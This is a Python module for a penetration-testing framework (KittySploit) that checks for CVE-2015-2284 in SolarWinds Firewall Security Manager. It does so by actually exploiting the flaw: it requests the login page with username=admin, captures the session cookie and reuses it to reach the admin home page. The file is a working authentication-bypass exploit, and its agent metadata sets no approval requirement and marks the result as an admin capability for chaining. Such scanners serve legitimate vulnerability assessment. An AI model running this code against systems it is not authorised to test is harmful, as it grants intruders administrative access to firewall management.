#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""SolarWinds FSM authentication bypass (CVE-2015-2284)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'SolarWinds FSM - Auth Bypass Detection (CVE-2015-2284)',
        'description': (
            'Detects CVE-2015-2284 by requesting userlogin.jsp?username=admin and reusing '
            'JSESSIONID to access requesthome.jsp as admin.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2015', 'solarwinds', 'fsm', 'auth-bypass', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'admin_surface', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2015-2284',
        ],
        'cve': 'CVE-2015-2284',
    }

    def run(self):
        for base in ('', '/fsm', '/FirewallSecurityManager'):
            r = self.http_request(
                method='GET',
                path=f'{base}/userlogin.jsp?username=admin',
                allow_redirects=False,
            )
            if not r or r.status_code != 200:
                continue
            body = r.text or ''
            if 'Authentication Not implemented yet' not in body:
                continue
            cookie = None
            for k, v in r.headers.items():
                if k.lower() == 'set-cookie' and 'JSESSIONID=' in v:
                    cookie = v.split(';')[0].strip()
                    break
            if not cookie:
                m = re.search(r'JSESSIONID=([0-9a-zA-Z]+)', '\n'.join(f'{k}: {v}' for k, v in r.headers.items()))
                if m:
                    cookie = 'JSESSIONID=' + m.group(1)
            if not cookie:
                continue
            g = self.http_request(
                method='GET',
                path=f'{base}/requesthome.jsp',
                headers={'Cookie': cookie},
                allow_redirects=False,
            )
            if g and 'Logged in as: admin' in (g.text or ''):
                self.set_info(
                    severity='critical',
                    reason='SolarWinds FSM auth bypass (CVE-2015-2284)',
                    path=f'{base}/userlogin.jsp',
                )
                return True
        return False
